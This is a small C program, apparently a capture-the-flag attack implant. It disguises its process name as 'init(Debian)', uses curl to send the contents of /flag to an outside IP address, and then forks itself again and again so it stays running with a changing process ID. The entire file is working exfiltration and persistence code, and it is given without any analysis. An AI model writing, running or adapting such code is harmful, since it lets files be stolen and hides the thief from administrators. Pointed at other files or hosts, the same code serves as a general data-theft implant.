#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/prctl.h>

#define PROCESS_NAME "init(Debian)"
#define SLEEP_TIME 10

void target()
{
    system("curl -d \"flag=`cat /flag`\" http://172.29.160.1:2334/ > /dev/null 2>&1");
}

int main(int argc, char *argv[])
{   
    // change process name
    prctl(PR_SET_NAME, (unsigned long)PROCESS_NAME, 0, 0, 0);
    target();
    sleep(SLEEP_TIME);
    pid_t pid = fork();
    if (pid < 0)
    {
        return 1;
    }
    else if (pid == 0)
    {
        // child
        main(1, NULL);
        exit(0);
    }
    else
    {
        // father
        exit(0);
    }

    return 0;
}
